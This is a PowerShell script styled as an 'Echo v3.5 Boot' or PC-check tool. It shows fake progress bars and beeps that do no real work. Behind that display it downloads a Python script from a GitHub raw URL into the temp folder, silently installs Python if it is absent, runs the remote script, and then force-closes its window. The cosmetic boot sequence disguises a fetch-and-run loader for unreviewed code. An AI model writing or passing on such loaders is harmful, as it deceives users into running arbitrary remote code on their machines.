$ErrorActionPreference = "Continue"

# --- fullscreen feel ---
[Console]::Clear()

function TypeLine($text, $speed = 40) {
    foreach ($char in $text.ToCharArray()) {
        Write-Host -NoNewline $char
        Start-Sleep -Milliseconds $speed
    }
    Write-Host ""
}

function BeepTick() {
    [console]::Beep(600, 80)
}

function ProgressBar($label, $time = 2.5) {
    Write-Host -NoNewline "$label ["
    $width = 30
    for ($i = 0; $i -le $width; $i++) {
        Write-Host -NoNewline "#"
        BeepTick
        Start-Sleep -Milliseconds ($time * 1000 / $width)
    }
    Write-Host "]"
}

Write-Host "====================================="
Write-Host "          Echo v3.5 Boot             "
Write-Host "====================================="
Write-Host ""

TypeLine "Initializing system environment..."
Start-Sleep 1

ProgressBar "Loading core modules"
ProgressBar "Allocating memory"
ProgressBar "Preparing runtime"
ProgressBar "Finalizing boot sequence"

Write-Host ""
TypeLine "System ready."
Write-Host ""

# --- download python script ---
$pyFile = Join-Path $env:TEMP "echo.py"
Invoke-WebRequest "https://raw.githubusercontent.com/xybv/PC_Check_Echo/refs/heads/main/echo.py" -OutFile $pyFile

# --- python check ---
$python = Get-Command python -ErrorAction SilentlyContinue
if (-not $python) { $python = Get-Command py -ErrorAction SilentlyContinue }

if (-not $python) {
    TypeLine "Python not detected. Installing..."
    $installer = Join-Path $env:TEMP "python_installer.exe"

    Invoke-WebRequest "https://www.python.org/ftp/python/3.13.0/python-3.13.0-amd64.exe" -OutFile $installer
    Start-Process $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait

    $python = Get-Command python -ErrorAction SilentlyContinue
}

if (-not $python) {
    TypeLine "Python install failed."
    Start-Sleep 2
    Stop-Process -Id $PID -Force
}

Write-Host ""
TypeLine "Launching module..."
Start-Sleep 1

& $python.Source $pyFile

Write-Host ""
TypeLine "Completed..."
Start-Sleep 2

Stop-Process -Id $PID -Force
